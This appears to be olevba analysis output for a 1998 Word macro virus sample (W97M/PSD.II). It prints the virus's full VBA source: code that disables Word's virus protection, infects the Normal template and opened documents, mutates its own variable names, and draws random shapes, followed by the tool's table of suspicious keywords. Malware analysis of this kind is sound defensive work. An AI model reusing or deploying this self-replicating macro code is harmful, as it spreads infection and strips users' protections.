olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-df638b96f38d1c8939474f90cdb98107d12e7b8a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-df638b96f38d1c8939474f90cdb98107d12e7b8a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For ED6562 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next ED6562: End If
IR2325 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
TT312 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set SN672 = ActiveDocument.VBProject.VBComponents.Item(1)
RR994 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set SN672 = NormalTemplate.VBProject.VBComponents.Item(1)
HO467 = True
Call GB9692_OA112
ActiveDocument.Saved = True
End If
If HO467 <> True And RR994 <> True Then GoTo TL6166
If HO467 = True Then SN672.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, IR2325 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If RR994 = True Then SN672.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, TT312 - 4))
TL6166:
If TT312 <> 0 And IR2325 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function GB9692_OA112()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "SJ8637": r1(2) = "EP4660": r1(3) = "OV8058": r1(4) = "AJ1533": r1(5) = "OA112": r1(6) = "IR2325"
r1(7) = "TT312": r1(8) = "RR994":: r1(9) = "SN672": r1(10) = "HO467": r1(11) = "TL6166": r1(12) = "GB9692": r1(13) = "RT8468": r1(14) = "LS5588": r1(15) = "ED6562"
For ED6562 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call OA112(a1, r1(ED6562))
Next ED6562
End Function 'VAMP v1.0 [thanks Vic!]
Private Function OA112(LS5588, RT8468 As String)
On Error Resume Next
Dim SJ8637 As Long: Dim EP4660 As Long: Dim OV8058 As Long: Dim AJ1533 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
SJ8637 = 1: EP4660 = 1: OV8058 = .CountOfLines: AJ1533 = Len(.Lines(.CountOfLines, 1))
Do While .Find(RT8468, SJ8637, EP4660, OV8058, AJ1533, True)
strline = .Lines(SJ8637, 1)
strline = Left(strline, EP4660 - 1) & LS5588 & Mid(strline, AJ1533)
.replaceline SJ8637, strline
SJ8637 = OV8058 + 1: EP4660 = 1:
OV8058 = .CountOfLines
AJ1533 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

